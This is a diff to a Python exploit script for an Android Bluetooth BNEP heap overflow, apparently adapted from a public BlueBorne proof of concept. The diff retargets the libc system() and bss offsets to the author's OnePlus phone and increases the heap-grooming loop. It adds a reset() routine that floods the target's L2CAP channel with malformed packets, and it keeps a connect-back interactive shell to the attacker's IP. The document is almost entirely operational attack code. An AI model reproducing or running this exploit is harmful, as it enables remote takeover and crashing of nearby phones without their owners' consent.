@@ -26,17 +26,21 @@ STDIN_PORT = 1235
 # bullhead:/ # sha1sum /system/lib/libc.so
 # 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so
 
-# For Pixel 7.1.2 patch level Aug/July 2017
+# For my OnePlus
+#libc_elf = ELF('./libc.so')
+
 LIBC_TEXT_STSTEM_OFFSET = 0x46b4c + 1 # system + 1
+#LIBC_TEXT_STSTEM_OFFSET = libc_elf.symbols['system'] + 1
 LIBC_SOME_BLX_OFFSET = 0x2a6f77
+
+BSS_ACL_REMOTE_NAME_OFFSET = 0x23CE48  #extract from ida, find in bss. btm_cb
+BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xfd81d
 
 # For Nexus 5X 7.1.2 patch level Aug/July 2017
 #LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
 #LIBC_SOME_BLX_OFFSET = 0x1a420 + 1
 
 # Aligned to 4 inside the name on the bss (same for both supported phones)
-BSS_ACL_REMOTE_NAME_OFFSET = 0x23CE48
-BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xfd81d
 
 MAX_BT_NAME = 0xf5
 
@@ -144,7 +148,7 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my
     # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
     # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
     # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
-    for i in range(30):
+    for i in range(50):
         bnep.send(binascii.unhexlify('8109' + '800109' * 100))
 
     # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
@@ -204,5 +208,20 @@ def main(src_hci, dst, my_ip):
     connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)
 
 
+def reset(target):
+    prog = log.progress('Resetting target...', target)
+    pkt = '\x81\x01\x00'+ '\x41'*8 
+    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    sock.connect((target, 0xf))
+    for i in range(1000):
+        sock.send(pkt)
+        data = sock.recv(1024)
+    sock.close()
+
+
+
 if __name__ == '__main__':
-    main(*sys.argv[1:])
+    if len(sys.argv) < 4:
+        reset(sys.argv[2])
+    else:
+        main(*sys.argv[1:])
